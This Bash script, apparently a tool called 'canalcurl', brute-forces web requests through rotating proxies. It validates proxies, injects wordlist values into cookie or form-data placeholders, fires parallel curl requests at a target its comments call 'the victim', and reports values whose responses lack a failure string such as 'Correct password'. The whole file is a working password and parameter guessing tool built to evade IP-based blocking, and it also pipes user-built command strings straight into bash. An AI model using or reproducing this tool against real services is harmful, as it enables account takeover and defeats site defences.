#!/bin/bash

#Autor: Adrian Ledesma Bello
#Link: https://www.canalhacker.com


function logo {

	echo
	echo -e "\e[37m _______      \e[34m                                                 ______   _      _  		     \e[m"
	echo -e "\e[37m!   ____!      ----       NAL     N       ----       L       \e[34m /&&&&&&   C|    !C  代>=,   (¡)	 "
	echo -e "\e[37m!  |         ==    ==     N \L    N     >>    <<     L       \e[34m |&        U|    !U  里   \  (|)   	 "
	echo -e "\e[37m!  |        >>------<<    N  \L   N    ==------==    L       \e[34m |&        R|    !R  服%%%#  (|)	 "
	echo -e "\e[37m!  |____   ==        ==   N   \L  N   >>        <<   L       \e[34m |&        L|    !L  务 \    (|)	 "
	echo -e "\e[37m!_______! ==          ==  N    \LAN  >>          <<  LLLLLLL \e[34m !|!|!|!>   CANAL#   器  \   (哈////.	 "
	echo -e "\e[m"

}

function send_request { ##### Check if the proxy is working and send the request.

	if [ "$param" == "1" ];then ##### Use one parameter

		par1=$(echo $request | awk -F "Canal_1" '{print $1}')
		par2=$(cat $file1 | head -n $v | tail -n 1)
		par3=$(echo $request | awk -F "Canal_1" '{print $2}')
		par="""$par1$par2$par3"""

		res=$(echo "curl -s -k -I --connect-timeout 20 $protocol $proxy $par" | bash 2>/dev/null) ##### Send the request to the victim
		res2=$(echo $res | wc -c)
		res1=$(echo $res | egrep """$filter""" | wc -c)

		if [ $res1 -lt 2 ];then

			if [ $res2 -gt 4 ];then

				echo -e "\e[93mVALID: $par2"

			else

				echo """$par2""" >> .invalid_parameters1

			fi

		fi

	else ##### Use two parameters

		par1=$(echo $request | awk -F "Canal_1" '{print $1}')
		par2=$(cat $file1 | head -n $v | tail -n 1)
		par3=$(echo $request | awk -F "Canal_1" '{print $2}' | awk -F "Canal_2" '{print $1}')
		par4=$(cat $file2 | head -n $vv | tail -n 1)
		par5=$(echo $request | awk -F "Canal_2" '{print $2}')
		par="""$par1$par2$par3$par4$par5"""

		res=$(echo "curl -s -k -I --connect-timeout 20 $protocol $proxy $par" | bash 2>/dev/null) ##### Send the request to the victim
		res2=$(echo $res | wc -c)
		res1=$(echo $res | egrep """$filter""" | wc -c)

		if [ $res1 -lt 2 ];then

			if [ $res2 -gt 4 ];then

	                        echo -e "\e[93mVALID: $(cat $file1 | head -n $v | tail -n 1) : $(cat $file2 | head -n $vv | tail -n 1)"

			else

				echo """$par2""" >> .invalid_parameters1
				echo """$par4""" >> .invalid_parameters2

			fi

                fi

	fi

}


function help { ##### Help

	while true;do

		clear
		logo
		echo
		echo -e "Youtube: \e[91mhttps://www.youtube.com/channel/UCdaWRMgjHdjRakxpJSInOkQ\e[0m"
		echo "Note: (Dont forget put the special characters like the next example)"
		echo -e 'Usage: canalcurl filewithproxy.txt <-x/--socks4/--socks5> <Filter strings> \e[4m"""\e[0m -H \e[4m'"'\e[0muser-agent:\e[4m'"'\e[0m -H \e[4m'"'\e[0mCookie:Canal_1\e[4m'"'\e[0m -H \e[4m'"'\e[0mdata=\e[4mCanal_2\e[0m\e[4m'"'\e[0m \e[4m"""\e[0m'
		echo -e 'Example: \e[93mcanalcurl \e[94mfilewithproxy.txt \e[95m--socks5 \e[96m'"'Correct password'"' \e[97m""" -H '"'user-agent:'"' -H '"'Cookie:Canal_1'"' -H '"'data:'"' '"'https://example.com/Canal_2'"'"""'
		echo -e "\e[0mUse only variable Canal_1 and Canal_2 and always 'simple quotes'.\e[0m"
		sleep 0.5
		clear
		logo
		echo
		echo -e "Youtube: \e[91mhttps://www.youtube.com/channel/UCdaWRMgjHdjRakxpJSInOkQ\e[0m"
		echo "Note: (Dont forget put the special characters like the next example)"
		echo -e 'Usage: canalcurl filewithproxy.txt <-x/--socks4/--socks5> <Filter strings> """ -H '"'user-agent:'"' -H '"'Cookie:Canal_1'"' -H '"'data=Canal_2'"' """'
		echo -e 'Example: \e[93mcanalcurl \e[94mfilewithproxy.txt \e[95m--socks5 \e[96m'"'Correct password'"' \e[97m""" -H '"'user-agent:'"' -H '"'Cookie:Canal_1'"' -H '"'data:'"' '"'https://example.com/Canal_2'"'"""'
		echo -e "\e[0mUse only variable Canal_1 and Canal_2 and always simple quotes."
		sleep 0.5

	done
	exit

}


function pxy {

	var=$(curl -s -k --connect-timeout 6 $protocol $proxy ifconfig.me)
	var1=$(echo $proxy | awk -F ":" '{print $1}')
	if [ "$var" == "$var1" ];then

		echo $proxy >> .valid_proxys.txt

	fi

}


function loop_one_parameter { ##### We use one parameter in the request

        for v in `seq 1 $(cat $file1 | wc -l)`;do

		let pos=$pos+1;

                if [ "$pos" == "$(cat .valid_proxys.txt | wc -l)" ];then

	                pos=1

                fi

                proxy=$(cat .valid_proxys.txt | head -n $pos | tail -n 1)
                send_request &
		sleep 0.1

        done

}


function loop_two_parameter_all_combinations { ##### We use two parameters in the request

        for v in `seq 1 $(cat $file1 | wc -l)`;do

                for vv in `seq 1 $(cat $file2 | wc -l)`;do

			let pos=$pos+1;

			if [ "$pos" == "$(cat .valid_proxys.txt | wc -l)" ];then

				pos=1

			fi

			proxy=$(cat .valid_proxys.txt | head -n $pos | tail -n 1)
			send_request &
			sleep 0.1

                done

        done

}

function loop_two_parameter_parallel {

	for v in `seq 1 $(cat $file1 | wc -l)`;do

		let vv=$vv+1;

		if [ "$vv" == "$(cat $file2 | wc -l)" ];then

			vv=1

		fi

		let pos=$pos+1;

		if [ "$pos" == "$(cat .valid_proxys.txt | wc -l)" ];then

			pos=1


		fi

		proxy=$(cat .valid_proxys.txt | head -n $pos | tail -n 1)
		send_request &
		sleep 0.1

	done

}

function exitt {

	ch=$(cat .invalid_parameters1 2>/dev/null | wc -c)
	if [ "$ch" -gt "2" ];then

		echo
		read -p $'\e[31mINFO: '"$(cat .invalid_parameters1 | wc -l)"' worng request, do you want try it again? (y/n)' repeat

		if [ "$repeat" == "y" ];then

			mv .invalid_parameters1 .tmp1
			mv .invalid_parameters2 .tmp2 2>/dev/null
			file1=".tmp1"
			file2=".tmp2"
			read -p $'Do you want check the proxies again?(y/n)' filter
			if [ "$filter" != "n" ];then

				prox=0
				echo -e "\e[36mChecking proxies again..."
				rm .valid_proxys.txt

			fi

		else

			rm .valid_proxys.txt .invalid_parameters1 .invalid_parameters2 .tmp1 .tmp2 2>/dev/null
			echo -e "\e[37m---------FINISH---------"
			pkill canalcurl.sh
			exit

		fi

	else

		rm .valid_proxys.txt .invalid_parameters1 .invalid_parameters2 .tmp1 .tmp2 2>/dev/null
		echo -e "\e[37m---------FINISH---------"
		pkill canalcurl.sh
		exit

	fi

}

function loops {

	sleep 6
	echo "$(cat .valid_proxys.txt | wc -l) proxys loaded from $prox"

	if [ "$param" == "1" ];then

		loop_one_parameter

	elif [ "$c" == "y" ];then

		loop_two_parameter_all_combinations

	else

		loop_two_parameter_parallel

	fi

	sleep 20

}


filter="n"
protocol=$2
filter=$3
request=$4


if [ "$1" == "-h" ] || [ "$1" == "--help" ] || [ $(echo "$filter" | wc -c) -lt 2 ];then

	help

fi

logo

if [ $(echo $request | grep 'Canal_[1-2]' | wc -c) -gt 5 ];then

	let param=$(echo "$request" | grep 'Canal_[1-2]' | sed 's/Canal_/\n/g' | wc -l)-1;
	echo
	echo -e "\e[97mYou are using $param parameters\e[0m"

	if [ "$param" == "1" ];then

		read -p $'\e[95mEnter file for parameter Canal_1: \e[0m' file1

	elif [ "$param" == "2" ];then

		read -p $'\e[95mEnter file for parameter Canal_1: \e[0m' file1
		read -p $'\e[95mEnter file for parameter Canal_2: \e[0m' file2
		read -p $'\e[92mDo you want try all combinations or send the parameters in parallel?(y for all combinations/n for parallel)' c

	else

		echo -e "\e[94mYou must put 1 or 2 parameters <Canal_1 Canal_2>\e[0m"
		exit

	fi

else

	echo -e "\e[94mYou must put 1 or 2 parameters <Canal_1 Canal_2>\e[0m"
	exit

fi

read -p $'\e[94mDid you take the proxys from the website hidemy.name with <Ctrl+a> and <Ctrl+c>? (y/n): \e[0m' p
rm .valid_proxys.txt 2>/dev/null
touch .valid_proxys.txt

if [ "$p" == "y" ];then

	while true;do

		if [ "$filter" != "n" ];then

			for proxy in $(cat `pwd`/$1 | egrep '\.|[0-9]' | grep -v [a-z] | grep "\." | sed 's/\t/:/g' | sed -e 's/.$//');do

				let prox=$prox+1
		                pxy &
		                sleep 0.1

		        done
			##### Now we have the proxys working

		fi

		loops
		exitt

	done
else

	echo "You must put the parameters like this: IP:PORT"
	echo "1.1.1.1:1234"
	echo "1.0.1.0:3574"
	echo "1.2.3.4:45654"
	echo "."
	echo "."
	echo "."
	echo "(Enter for OK)"
	read ok
	if [ -v $ok ];then

		while true;do

			if [ "$filter" != "n" ];then

			        for proxy in $(cat `pwd`/$1);do

					let prox=$prox+1
			                pxy &
			                sleep 0.1

			        done
				##### Now we have the proxys working

			fi
			loops
			exitt

		done

	fi

fi
